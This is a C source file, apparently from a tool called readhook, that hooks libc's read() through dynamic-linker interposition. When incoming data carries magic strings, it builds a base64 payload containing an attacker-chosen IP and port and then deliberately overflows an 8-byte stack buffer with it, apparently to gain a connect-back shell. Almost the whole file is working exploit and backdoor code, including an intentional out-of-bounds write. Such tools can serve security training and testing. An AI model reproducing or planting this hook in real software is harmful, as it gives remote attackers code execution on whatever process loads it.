#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// For dlsym()
#include <netdb.h>	// For gethostbyname()
#include <stdio.h>	// For i/o
#include <string.h>	// For str...() and mem...()

#include "addresses.h"
#include "base64.h"
#include "payload.h"
#include "strnstr.h"

static const char s_basemagic[]	= "xyzzy";
static const char s_fullmagic[]	= "xyzzx";
static const char s_makeload[]	= "MAKELOAD";
static const char s_dumpload[]	= "DUMPLOAD";
static const char s_overload[]	= "OVERLOAD";
static const char s_overflow[]	= "OVERFLOW";

// Parse (optional) [ <a.b.c.d> | <hostname> ] <:port>
static ssize_t parseHostAndPort(char *p, struct in_addr *ipAddress, unsigned short *port) {
	char s_host[256];
	unsigned short nport;
	int nc = 0, ns = sscanf(p, "%[A-Za-z0-9-.]%n:%hu%n", s_host, &nc, &nport, &nc);
	assert(ns >= 0 && ns <= 2);

	*port = htons((ns > 1) ? nport : 5555);

	// See if the s_host string can be parsed by inet_aton()
	if (inet_aton(s_host, ipAddress) == 0)
		for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
			for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
 				*ipAddress = *((struct in_addr **) he->h_addr_list)[i];

	// Return number of characters consumed parsing the Host and IP Address.
	return nc;
} // parseHostAndPort()

// In-place substitution of request with result. So wrong... 
static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np) {
	// Parse the IP Address and port into our payload
	int nc = parseHostAndPort(p, &plp->pl_scu.sc.ipAddress, &plp->pl_scu.sc.port);
	
	// Generate the payload that we will "echo" back
	unsigned char sPayload64[4096];
	size_t nPayload64 = b64Encode((const unsigned char *) plp, sizeof(*plp), sPayload64, sizeof(sPayload64));

	// Make room for the payload (where the request used to be).
	char *src = p + nc;
	char *dst = p + nPayload64 - strlen(s_fullmagic) + strlen(s_basemagic) - strlen(s_makeload) + strlen(s_overflow);
	int delta = dst - src;
	memmove(dst, src, np - nc);

	// Replace s_fullmagic with s_basemagic
	memcpy(p - strlen(s_makeload) - strlen(s_fullmagic), s_basemagic, strlen(s_basemagic));
	p += strlen(s_basemagic) - strlen(s_fullmagic);

	// Replace s_makeload with s_overflow
	memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
	p += strlen(s_overflow) - strlen(s_makeload);

	// Place the payload in the newly created space
	memcpy(p, sPayload64, nPayload64);

	return delta;
} // falseEcho()

// IDENTICAL to overflow(), but with two dumpload() calls for debugging.
static void overload(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
	char buffer[8] = {0};

	dumpload(p, baseAddressesPtr);
	baseAddressesPtr->buf_base = &buffer;
	dofixups(p, n, baseAddressesPtr);
	dumpload(p, baseAddressesPtr);
	memcpy(buffer, p, n);
} // overload()

// This is the overflow that readhook is all about.
static void overflow(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
	char buffer[8] = {0};

	baseAddressesPtr->buf_base = &buffer;
	dofixups(p, n, baseAddressesPtr);
	memcpy(buffer, p, n);
} // overflow()

// Interloper read function that watches for the magic string.
typedef
ssize_t Read(int fd, void *buf, size_t count);
ssize_t read(int fd, void *buf, size_t count) {
	Read *libc_read = (Read *) dlsym(RTLD_NEXT, "read");
	ssize_t result = libc_read(fd, buf, count);

	char *p = (result < strlen(s_fullmagic)) ? NULL : strnstr(buf, s_fullmagic, result);

	if (p) {
		p += strlen(s_fullmagic);

		static BaseAddresses baseAddresses;
		static Payload payload;

		static int initialized = 0;
		if (!initialized) {
			initBaseAddresses(&baseAddresses);
			initload(&payload);
			initialized++;
		} // if

		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
			p += strlen(s_makeload);

			makeload(&payload, &baseAddresses);

			result += falseEcho(&payload, p, result - (p - (char *)buf));

			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
			((char *) buf)[result] = 0;
		} // if
		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
			dumpload(&payload, &baseAddresses);
		else if (!strncmp(s_overload, p, strlen(s_overload)))
			overload(&payload, sizeof(payload), &baseAddresses);
		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
			size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) p, 65535);
			overflow(p, n256, &baseAddresses);
		} // else if
	} // if

	return result;
} // read()

#ifdef FULLHOOK_MAIN
int main(int argc, char **argv)
{
	fprintf(stderr, "Running (testing) as an executable\n");

	BaseAddresses baseAddresses;
	initBaseAddresses(&baseAddresses);

	Payload payload;
	initload(&payload);
	makeload(&payload, &baseAddresses);
	if (argc > 1)
		parseHostAndPort(argv[1], &payload.pl_scu.sc.ipAddress, &payload.pl_scu.sc.port);

	overload(&payload, sizeof(payload), &baseAddresses);
} // main()
#endif
